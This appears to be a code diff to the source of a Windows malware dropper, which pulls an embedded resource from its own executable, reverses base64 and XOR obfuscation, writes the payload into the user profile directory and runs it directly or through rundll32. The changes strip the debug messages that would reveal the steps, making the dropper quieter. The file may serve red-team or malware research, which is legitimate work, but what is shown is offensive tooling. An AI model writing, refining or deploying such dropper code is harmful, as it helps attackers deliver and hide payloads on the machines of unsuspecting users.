@@ -69,7 +69,6 @@ int main(int argc, char* argv[])
 
 	setup_name();
 
-	printf("The macro is: %s. The xor key is: %d. The base64 is: %d\n", DROPPER_OUTPUT, DROPPER_XOR_KEY, DROPPER_BASE64);
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
 	// Locate Resource
@@ -83,12 +82,10 @@ int main(int argc, char* argv[])
 	// Obfuscation Procedures start here
 
 	#if DROPPER_BASE64 == 1
-		printf("Base64 has been run!\n");
 		data = base64decode(data, &size);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		printf("Xor has been run!\n");
 		data = XOR(data, size);
 	#endif
 
@@ -119,7 +116,7 @@ void setup_name() {
 		name[sizeof(name) - 1] = '\0';
 	}
 	else {
-		printf("Temp was null");
+		printf("UserProfile was null");
 	}
 
 }
@@ -139,7 +136,6 @@ void set_name()
 	}
 #else
 	strcat(name, DROPPER_OUTPUT);
-	printf("Name is: %s\n", name);
 #endif
 }
 
@@ -153,14 +149,12 @@ void launch()
 	ZeroMemory(&pi, sizeof(pi));
 	// build injection command
 #ifdef INJECT
-	std::cout << "Inject macro defined" << std::endl;
 	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
 	char args[100 * NAME_SIZE];
 	sprintf_s(args, 999, "%s %s", cmd, name);
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	// call directly
 #else
-	printf("Inject macro not defined\n");
 	BOOL err = CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	if (!err) {
 		printf("Create Process failed. Error: %u\n", GetLastError());
@@ -230,7 +224,6 @@ void* XOR(void* data, int size) {
 // Drop buffer to file
 void drop(int size, void* buffer)
 {
-	printf("This is name: [%s]", name);
 	FILE* f = fopen(name, "wb");
 	// traverse byte list
 	if (!f) {
